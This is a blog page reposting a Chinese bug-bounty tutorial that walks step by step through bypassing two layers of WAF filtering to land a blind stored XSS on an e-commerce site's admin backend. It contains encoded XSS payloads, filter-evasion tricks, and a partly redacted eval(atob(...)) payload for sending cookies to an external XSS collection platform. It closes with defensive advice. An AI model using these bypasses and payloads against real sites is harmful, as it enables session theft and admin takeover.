@@ -1,0 +1,294 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>XSS绕过防护盲打某SRC官网后台 | Fstraw Blog</title><meta name="keywords" content="基础漏洞"><meta name="author" content="Fstraw"><meta name="copyright" content="Fstraw"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="转载自：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;RPA-eaMYeM1mnz01BHh-Uw 荐语：非常不错的一篇XSS挖掘教学文章，由浅入深，通俗易懂，实用性强。  Part1 前言已经N年没挖SRC了，前几年曾有一段时间对XSS漏洞挖掘特别热衷，像反射型XSS、存储型XSS、DOM型XSS等挖得很上瘾，记下了很多笔记。遗憾的是多数平台都不愿意接收XSS漏洞，哪怕是存储型XSS漏">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS绕过防护盲打某SRC官网后台">
+<meta property="og:url" content="https://ccc-f.github.io/posts/73d2042e.html">
+<meta property="og:site_name" content="Fstraw Blog">
+<meta property="og:description" content="转载自：https:&#x2F;&#x2F;mp.weixin.qq.com&#x2F;s&#x2F;RPA-eaMYeM1mnz01BHh-Uw 荐语：非常不错的一篇XSS挖掘教学文章，由浅入深，通俗易懂，实用性强。  Part1 前言已经N年没挖SRC了，前几年曾有一段时间对XSS漏洞挖掘特别热衷，像反射型XSS、存储型XSS、DOM型XSS等挖得很上瘾，记下了很多笔记。遗憾的是多数平台都不愿意接收XSS漏洞，哪怕是存储型XSS漏">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ccc-f.github.io/img/backup.jpg">
+<meta property="article:published_time" content="2022-11-03T15:03:50.827Z">
+<meta property="article:modified_time" content="2023-04-28T09:21:02.828Z">
+<meta property="article:author" content="Fstraw">
+<meta property="article:tag" content="基础漏洞">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ccc-f.github.io/img/backup.jpg"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="canonical" href="https://ccc-f.github.io/posts/73d2042e"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><meta name="google-site-verification" content="google3c676eb36348f5df"/><meta name="baidu-site-verification" content="de191936ea3ee4fffaba389d103fb230"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.bootcdn.net/ajax/libs/font-awesome/6.1.1/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="/js/fancybox.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?32fff2d27aa7e0c7fad7396cabeaa45b";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
+  noticeOutdate: {"limitDay":500,"position":"top","messagePrev":"已经超过","messageNext":"天，自上次更新后，文章内容可能已经过时。"},
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":200},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":300,"languages":{"author":"作者: Fstraw","link":"链接: ","source":"来源: Fstraw Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery@2/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'XSS绕过防护盲打某SRC官网后台',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-04-28 17:21:02'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><link rel="stylesheet" href="/butterflyChange/css/myfont.css"<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Fstraw Blog" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/profile.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data is-center"><div class="data-item"><a href="/archives/"><div class="headline">文章</div><div class="length-num">123</div></a></div><div class="data-item"><a href="/tags/"><div class="headline">标签</div><div class="length-num">35</div></a></div><div class="data-item"><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/time/"><i class="fa-fw fas fa-calendar"></i><span> 时光轴</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/photo/"><i class="fa-fw fas fa-camera"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接导航</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/backup.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Fstraw Blog</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 目录</span></a></div><div class="menus_item"><a class="site-page" href="/time/"><i class="fa-fw fas fa-calendar"></i><span> 时光轴</span></a></div><div class="menus_item"><a class="site-page group" href="javascript:void(0);" rel="external nofollow noreferrer"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down"></i></a><ul class="menus_item_child"><li><a class="site-page child" href="/photo/"><i class="fa-fw fas fa-camera"></i><span> 照片</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 链接导航</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">XSS绕过防护盲打某SRC官网后台<a class="post-edit-link" href="https://github.com/ccc-f/ccc-f.github.io/edit/master/posts/73d2042e.html" rel="external nofollow noreferrer" title="编辑" target="_blank"><i class="fas fa-pencil-alt"></i></a></h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-03T15:03:50.827Z" title="发表于 2022-11-03 23:03:50">2022-11-03</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-04-28T09:21:02.828Z" title="更新于 2023-04-28 17:21:02">2023-04-28</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/">渗透测试</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">2.3k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>8分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="XSS绕过防护盲打某SRC官网后台"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span><span class="post-meta-separator">|</span><span class="post-meta-commentcount"><i class="far fa-comments fa-fw post-meta-icon"></i><span class="post-meta-label">评论数:</span><a href="/posts/73d2042e.html#post-comment" itemprop="discussionUrl"><span class="valine-comment-count" data-xid="/posts/73d2042e.html" itemprop="commentCount"></span></a></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><blockquote>
+<p>转载自：<a target="_blank" rel="noopener external nofollow noreferrer" href="https://mp.weixin.qq.com/s/RPA-eaMYeM1mnz01BHh-Uw">https://mp.weixin.qq.com/s/RPA-eaMYeM1mnz01BHh-Uw</a></p>
+<p>荐语：非常不错的一篇XSS挖掘教学文章，由浅入深，通俗易懂，实用性强。</p>
+</blockquote>
+<h2 id="Part1-前言"><a href="#Part1-前言" class="headerlink" title="Part1 前言"></a><strong>Part1 前言</strong></h2><p>已经N年没挖SRC了，前几年曾有一段时间对XSS漏洞挖掘特别热衷，像反射型XSS、存储型XSS、DOM型XSS等挖得很上瘾，记下了很多笔记。遗憾的是多数平台都不愿意接收XSS漏洞，哪怕是存储型XSS漏洞给的评分都很低，因为XSS不能造成直接危害，利用起来有困难。所以当时花费了2天的时间，绕过各种防护及过滤，盲打到了一个SRC电商官网的后台。正好公众号文章写到现在，也缺少一篇讲解XSS漏洞的文章，<strong>这次就分享这个XSS拿权限的实战案例吧</strong>。</p>
+<p><strong>注：</strong>鉴别于好多朋友之前写文章，引用真实报告的截图而忘记打码，出过好几次事故。所以ABC_123写文章的原则是，一概不贴真实截图，只贴虚拟机环境的图，还望大家谅解。</p>
+<p><strong>后期会专门出一期讲解DOM型XSS漏洞挖掘的文章，欢迎大家关注公众号。</strong></p>
+<h2 id="Part2-技术研究过程"><a href="#Part2-技术研究过程" class="headerlink" title="Part2 技术研究过程"></a><strong>Part2 技术研究过程</strong></h2><p> <strong>1</strong> <strong>选择一个合适的Payload</strong></p>
+<p>对于挖掘XSS漏洞，我的经验是第一步就是要选择一个合适的Payload进行试验，然后逐步绕过各种防护。举个例子，你是首先选择</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(1)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>，还是选择</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>去开展XSS绕过工作呢？有朋友是用一大堆的payload做成XSS字典去FUZZ测试，这种方法高效快速，但是缺点是只能测试反射型XSS，然后工具自带的payload都是网上公开的，早就被各种WAF设备给分析过了，被拦截的可能性很大。</p>
+<p> <strong>2</strong> <strong>选择<code>&lt;image&gt;</code>标签绕过</strong></p>
+<p>对于<code>&lt;script&gt;</code>这种的payload，如果不是变形的，基本上现在随便一个WAF设备都能准确识别了，存活的可能性比较低。对于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1 onerror=alert(1)&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这个payload还有一些希望，但是<strong>alert</strong>关键字太明显，直接提交也是不行的。</p>
+<p>于是将测试payload精简一下，变成如下格式</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=1&gt;</span><br></pre></td></tr></table></figure>
+
+<p>提交还是被拦截。</p>
+<p>那么就再精简一下，直接提交一个**<code>&lt;img&gt;</code><strong>，发现还是被拦截，至此我们知道，</strong><code>&lt;img&gt;</code>**标签完全被干掉了。</p>
+<p><code>&lt;img&gt;</code>标签不行，那么换一个<code>&lt;image&gt;</code>标签提交一下，发现没有被拦截，那么我们就选择<code>&lt;image&gt;</code>标签来开展XSS绕过工作吧。</p>
+<p> <strong>3</strong> <strong>对于src&#x3D;附近的拦截绕过</strong></p>
+<p>经过探测**&lt;image src&#x3D;&gt;** 中间只要有空格、TAB键都会被拦截，所以换成这种形式**&lt;image&#x2F;src&#x3D;&gt;**，用&#x2F;这个符号替代空格。</p>
+<p>接下来看&#x3D;号的左右两边，程序又做了判断，<strong>src&#x3D;<strong>的右边只要是数字、字母啥的，就会被拦截。经过测试，发现</strong>src&#x3D;<strong>右边是可以接特殊字符串的，所以语句变成如下格式</strong>&lt;image&#x2F;src&#x3D;|&gt;<strong>（</strong>注：这个是特殊字符竖杠，不是字母或者数字</strong>），这样就绕过了防护。如下图所示，网页中出现了一个图片报错，说明上述payload被正常解析了，绕过了防护。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/XSS%E7%BB%95%E8%BF%87%E9%98%B2%E6%8A%A4%E7%9B%B2%E6%89%93%E6%9F%90SRC%E5%AE%98%E7%BD%91%E5%90%8E%E5%8F%B0/640.png" alt="图片"></p>
+<p> <strong>4</strong> <strong>对于事件属性附近的拦截绕过</strong></p>
+<p>接下来为了能够利用XSS漏洞拿到权限，就必须想办法让上述XSS攻击代码能够加载远程js文件，以备实现获取Cookie、添加管理员账号等功能。</p>
+<p>所以只有**&lt;image&#x2F;src&#x3D;|&gt;**这个payload是不行的，还需要进一步绕过防护。</p>
+<p>为了加载js链接地址执行js代码，<strong>一般可以借助事件属性加载</strong>，比如说添加鼠标点击事件、鼠标滑过事件等。这里我们选择一个onerror事件，于是将payload进一步变成**&lt;img&#x2F;src&#x3D;| onerror&#x3D;alert(111)&gt;**。</p>
+<p><strong>onerror&#x3D;alert(111)<strong>这部分绕起来很难，经过一系列测试，发现在&#x3D;号左右两边加上TAB键，变成如下格式</strong>onerror &#x3D; alert(111)<strong>可以绕过&#x3D;附近的拦截，但是</strong>alert(111)</strong> 这个部分还是会被拦截，怎么办呢？我想到了借助<strong>javascript：伪协议</strong>，因为javascript:这部分可以接各种编码，之后测试的payload变成如下格式**&lt;images&#x2F;src&#x3D;| onerror &#x3D; javascript:alert(111)&gt;**</p>
+<p><strong>接下来将javascript:alert(111) 编码成16进制格式：</strong></p>
+<p><strong>javascript:alert(111)</strong></p>
+<p>结果发现被拦截，到这一步还被拦截，基本上就难办了。但是经过测试，发现它只是拦截了；这个特殊字符。至于为什么会拦截；呢，我想它的本意不是为了拦截XSS，是为了拦截多语句的SQL注入的分号。</p>
+<p>但是幸运的是，上述16进制编码的payload语句，<strong>把；去掉，一样是可以触发漏洞的</strong>，分号可有可无。</p>
+<p>于是上述16进制的payload就变成了如下格式：</p>
+<p><strong>&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3a&amp;#x61&amp;#x6c&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x31&amp;#x31&amp;#x31&amp;#x29</strong></p>
+<p>组合起来最终的弹窗完整的payload是如下形式：</p>
+<p><strong>&lt;image&#x2F;src&#x3D;| onerror &#x3D; javascript:alert(111)&gt;</strong></p>
+<p>直接用burpsuite抓包提交是不行的，因为&amp;会与POST请求数据包中的&amp;分割符重复，这个好解决，可以对payload进行URL编码一样吧。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/XSS%E7%BB%95%E8%BF%87%E9%98%B2%E6%8A%A4%E7%9B%B2%E6%89%93%E6%9F%90SRC%E5%AE%98%E7%BD%91%E5%90%8E%E5%8F%B0/640-166418044646645.png" alt="图片"></p>
+<p><strong>URL编码后的payload大致如下所示：</strong></p>
+<p><strong>&lt;image&#x2F;src&#x3D;| onerror &#x3D; %26%23%78%36%61%26%23%78%36%31%26%23%78%37%36%26%23%78%36%31%26%23%78%37%33%26%23%78%36%33%26%23%78%37%32%26%23%78%36%39%26%23%78%37%30%26%23%78%37%34%26%23%78%33%61%26%23%78%36%31%26%23%78%36%63%26%23%78%36%35%26%23%78%37%32%26%23%78%37%34%26%23%78%32%38%26%23%78%33%31%26%23%78%33%31%26%23%78%33%31%26%23%78%32%39&gt;</strong></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/XSS%E7%BB%95%E8%BF%87%E9%98%B2%E6%8A%A4%E7%9B%B2%E6%89%93%E6%9F%90SRC%E5%AE%98%E7%BD%91%E5%90%8E%E5%8F%B0/640-166418044646746.png" alt="图片"></p>
+<p> <strong>5</strong> <strong>Change Body encoding绕过第2道防护</strong></p>
+<p>提交之后，发现它有两道防护，因为到这一步没有原先的403错误提示了，直接是超时等待了一段时间，说明我们刚才的不懈努力只是绕过了第1道防护，而第2道防护没有绕过去，到这里我已经快放弃了。。。最终经过测试，<strong>发现使用burpsuite的“change body encoding”把POST数据包格式改一下即可绕过第2道防护</strong>。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/XSS%E7%BB%95%E8%BF%87%E9%98%B2%E6%8A%A4%E7%9B%B2%E6%89%93%E6%9F%90SRC%E5%AE%98%E7%BD%91%E5%90%8E%E5%8F%B0/640-166418044646747.png" alt="图片"></p>
+<p>最终将如下格式数据包编码后提交，**&lt;image&#x2F;src&#x3D;| onerror &#x3D; javascript:alert(document.cookie)&gt;**</p>
+<p>最终本地绕过2道防护，可以弹出Cookie了（以下截图为本地虚拟机环境截图，原图敏感，就不放出来了）</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/XSS%E7%BB%95%E8%BF%87%E9%98%B2%E6%8A%A4%E7%9B%B2%E6%89%93%E6%9F%90SRC%E5%AE%98%E7%BD%91%E5%90%8E%E5%8F%B0/640-166418044646748.png" alt="图片"></p>
+<p> <strong>6</strong> <strong>XSS盲打平台</strong></p>
+<p>接下来就是找XSS盲打平台了，建议大家自己从网上找一个别人搭建好的XSS盲打平台测试吧，因为自己搭建XSS平台，还得买域名、还怕泄露真实身份信息，而且网上的PHP的XSS平台代码也有不少坑，有时候wamp能搭建成功，phpstudy就搭建不成功。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/XSS%E7%BB%95%E8%BF%87%E9%98%B2%E6%8A%A4%E7%9B%B2%E6%89%93%E6%9F%90SRC%E5%AE%98%E7%BD%91%E5%90%8E%E5%8F%B0/640-166418044646749.png" alt="图片"></p>
+<p>最终看了一下XSS平台给出的payload语句，结合javascript为协议，组合成可真正获取Cookie的测试payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;image/src=| onerror = javascript:eval(atob(&#x27;cz1jxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxhbmRvbSgp&#x27;))&gt;</span><br></pre></td></tr></table></figure>
+
+<p><em><strong>*编码成16进制格式如下：*</strong></em></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/XSS%E7%BB%95%E8%BF%87%E9%98%B2%E6%8A%A4%E7%9B%B2%E6%89%93%E6%9F%90SRC%E5%AE%98%E7%BD%91%E5%90%8E%E5%8F%B0/640-166418044646750.png" alt="图片"></p>
+<p>上图为虚拟机测试图，到这一步呢，我才发现，原来这个src官网，防xss是这样防范的，假设官网的管理员后台地址是<a href="https://admin.xxx.src.com.cn。我本地打开这个后台地址，**发现这个官网后台限制了只有内网ip才能登陆！**到这一步，我才惊讶地发现，原来这样可以防止XSS盲打Cookie的攻击，它直接限制管理员后台的登陆，打到Cookie也没用！难道我们就没有办法了吗？经过一系列查找资料，还是有办法解决的，使用XSS隧道，或者XSS代理。" rel="external nofollow noreferrer">https://admin.xxx.src.com.cn。我本地打开这个后台地址，**发现这个官网后台限制了只有内网ip才能登陆！**到这一步，我才惊讶地发现，原来这样可以防止XSS盲打Cookie的攻击，它直接限制管理员后台的登陆，打到Cookie也没用！难道我们就没有办法了吗？经过一系列查找资料，还是有办法解决的，使用XSS隧道，或者XSS代理。</a></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/XSS%E7%BB%95%E8%BF%87%E9%98%B2%E6%8A%A4%E7%9B%B2%E6%89%93%E6%9F%90SRC%E5%AE%98%E7%BD%91%E5%90%8E%E5%8F%B0/640-166418044646751.png" alt="图片"></p>
+<p> <strong>7</strong> <strong>XSS 隧道代理</strong></p>
+<p>这个工具大概暂时只是概念性质的，我当时测试的效果是非常不好用。因为本地搭建环境测试，一旦我这边挂上XSS代理，受害者那边的浏览器就会卡死，一旦受害者关闭浏览器，代理也随之失效。到目前还没有找到一个靠谱的XSS Proxy代理工具，<strong>所以这是一种解决方案，但是没法用于实战</strong>，不知道现在网上有没有出新的靠谱的工具。</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/ccc-f/../imgs/XSS%E7%BB%95%E8%BF%87%E9%98%B2%E6%8A%A4%E7%9B%B2%E6%89%93%E6%9F%90SRC%E5%AE%98%E7%BD%91%E5%90%8E%E5%8F%B0/640-166418044646752.png" alt="图片"></p>
+<p>至此，一条曲折的XSS实战利用道路就完成了，收获不少。</p>
+<p> <strong>Part3 总结</strong> </p>
+<p><strong>1.</strong> 防止XSS盲打，可以禁止管理员后台的外网登录，限制仅内网可以登录。这样一来即使攻击者通过XSS拿到有效Cookie，也没法用于后台的登录。记得设置HttpOnly属性。</p>
+<p><strong>2.</strong> 对于XSS 代理或者XSS隧道，如果大家有稳定靠谱的工具，能用于实战的，还希望推荐一下。</p>
+</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/">基础漏洞</a></div><div class="post_share"><div class="social-share" data-image="/img/backup.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="/js/social-share.min.css" media="print" onload="this.media='all'"><script src="/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/img/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" src="/img/alipay.jpg" alt="支付宝"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/4fdc8cf6.html"><img class="prev-cover" src="/img/backup.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">个人备忘录007</div></div></a></div><div class="next-post pull-right"><a href="/posts/71ac9e67.html"><img class="next-cover" src="/img/backup.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">XXE 注入漏洞总结</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/8374b3f7.html" title="CRLF漏洞总结"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">CRLF漏洞总结</div></div></a></div><div><a href="/posts/c4ebf98a.html" title="CSV 注入总结"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">CSV 注入总结</div></div></a></div><div><a href="/posts/cac67493.html" title="JWT认证攻击漏洞总结"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">JWT认证攻击漏洞总结</div></div></a></div><div><a href="/posts/51c52f90.html" title="SSTI 漏洞总结"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">SSTI 漏洞总结</div></div></a></div><div><a href="/posts/e31d1783.html" title="XFF注入漏洞的进阶利用"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">XFF注入漏洞的进阶利用</div></div></a></div><div><a href="/posts/71ac9e67.html" title="XXE 注入漏洞总结"><img class="cover" src="/img/backup.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-11-03</div><div class="title">XXE 注入漏洞总结</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas 